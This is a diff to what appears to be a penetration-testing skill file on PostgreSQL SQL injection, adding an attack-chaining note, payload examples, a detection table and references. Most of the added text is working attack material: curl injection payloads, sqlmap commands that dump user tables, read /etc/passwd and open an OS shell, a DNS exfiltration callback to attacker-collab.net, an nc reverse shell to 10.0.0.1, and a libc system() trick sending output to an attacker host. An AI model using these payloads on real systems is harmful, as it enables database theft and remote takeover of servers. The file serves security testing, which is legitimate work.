@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "PostgreSQL Injection grants INSERT/UPDATE access to write an unsanitized script payload directly into a stored field, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
 ---
 
 # wstg-inpv-05.4
@@ -346,6 +347,83 @@ SELECT * FROM dblink('host=attacker.com user=' || current_user || ' dbname=a', '
 
 ---
 
+## Example Commands/Payloads
+
+### Detection (curl)
+
+```bash
+TARGET="https://target.com/product"
+
+# PostgreSQL-specific error trigger
+curl -s "$TARGET?id=1'" | grep -Ei "PostgreSQL query failed|pg_query|syntax error at or near"
+
+# Native time-based blind (pg_sleep)
+time curl -s "$TARGET?id=1'; SELECT pg_sleep(5)--" -o /dev/null
+time curl -s "$TARGET?id=1' AND (SELECT 1 FROM pg_sleep(5))-- -" -o /dev/null
+
+# Version/user fingerprint via UNION
+curl -s "$TARGET?id=1 UNION SELECT version(),current_user,NULL--"
+
+# Cast-error based data extraction (forces value into error message)
+curl -s "$TARGET?id=1 AND 1=CAST((SELECT current_user) AS int)--"
+```
+
+### SQLMap (PostgreSQL)
+
+```bash
+sqlmap -u "https://target.com/product?id=1" --dbms=postgresql --banner
+sqlmap -u "https://target.com/product?id=1" --dbms=postgresql --dbs
+sqlmap -u "https://target.com/product?id=1" --dbms=postgresql -D target_db -T users --dump
+sqlmap -u "https://target.com/product?id=1" --dbms=postgresql --file-read=/etc/passwd
+sqlmap -u "https://target.com/product?id=1" --dbms=postgresql --os-shell     # requires superuser + dblink/lo_import
+```
+
+### Command Execution via COPY TO/FROM PROGRAM (PostgreSQL >= 9.3)
+
+Requires superuser or the `pg_execute_server_program` role — pipes query output to/from an OS process, no extension needed:
+
+```sql
+-- Blind OOB exfiltration (DNS callback carries current_user)
+'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.attacker-collab.net'--
+
+-- Reverse shell
+'; CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'--
+```
+
+### Command Execution via libc.so.6 (fallback when COPY PROGRAM is restricted)
+
+```sql
+'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT; SELECT system('id > /tmp/out; cat /tmp/out | nc attacker-ip 4444');--
+```
+
+### Full-Dump Exfiltration via query_to_xml (no LIMIT juggling)
+
+Combine with the CAST error-based oracle to pull an entire result set in one shot instead of one row at a time:
+
+```sql
+' AND 1=CAST((SELECT query_to_xml('select * from pg_user',true,true,'')) AS int)--
+```
+
+### Dollar-Quote / CHR() WAF Bypass (no single quotes needed)
+
+```sql
+SELECT $$NoQuoteNeeded$$;
+SELECT CHR(65)||CHR(66)||CHR(67);   -- builds 'ABC' without any quote character
+```
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| `PostgreSQL query failed` / `syntax error at or near` / `pg_query()` in response | Error-based SQLi, confirms PostgreSQL backend |
+| Response delayed exactly N seconds for `pg_sleep(N)` | Time-based blind SQLi |
+| `CAST(... AS int)` error message leaks the cast value (e.g. `invalid input syntax for integer: "postgres"`) | Error-based data exfiltration via type-cast errors |
+| `dblink`/`pg_read_file` succeeds | Superuser or `pg_read_server_files` role — file read/RCE path available |
+| DNS callback received from `COPY (...) TO PROGRAM 'nslookup ...'` | `pg_execute_server_program` role confirmed — command execution available without any extension |
+| `query_to_xml()` returns a full table dump inside a single error/cast payload | Bulk exfiltration channel, avoids row-by-row `LIMIT`/`OFFSET` enumeration |
+
+---
+
 ## Remediation
 
 ```python
@@ -382,6 +460,13 @@ pool.query("SELECT * FROM users WHERE id = $1", [userId])
 | ---------- | ------------- |
 | **CWE-89** | SQL Injection |
 
+---
+
+## References
+
+- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [PortSwigger SQL Injection Cheat Sheet - PostgreSQL](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [PayloadsAllTheThings - SQL Injection (PostgreSQL)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#postgresql)
 
 ---
 
